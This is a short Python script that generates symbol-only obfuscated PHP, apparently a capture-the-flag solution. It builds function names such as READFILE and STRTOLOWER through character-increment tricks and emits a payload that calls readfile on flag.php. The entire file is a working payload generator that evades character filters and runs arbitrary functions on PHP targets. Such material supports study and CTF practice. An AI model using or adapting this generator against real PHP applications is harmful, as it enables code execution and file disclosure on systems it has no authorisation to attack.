def gen_byte(c):
  out = '$__="_"=="[";'
  out += '$__++;' * ord(c)
  out += '$__=$____($__);'
  return out

def gen_str(var_name, s):
  out = '$%s="";' % var_name
  for c in s:
    out += gen_byte(c)
    out += '$%s.=$__;' % var_name
  return out

def gen_upper(var_name, s):
  out = '$%s="";' % var_name
  for c in s.upper():
    out += '$_=[];$_="$_";$_=$_["_"=="["];'
    if c in '$()[].+_':
      out += '$%s.="%s";' % (var_name, c)
    else:
      out += '$_++;' * (ord(c) - ord('A'))
      out += '$%s.=$_;' % var_name
  return out

def gen_lower(var_name, s):
  out = gen_upper('________', 'STRTOLOWER')
  out += gen_upper('_________', s.upper())
  out += '$%s=$________($_________);' % var_name
  return out

payload = gen_upper('____', 'READFILE')
payload += gen_upper('______', 'FLAG.PHP')
payload += """$____($______);"""
print(payload)
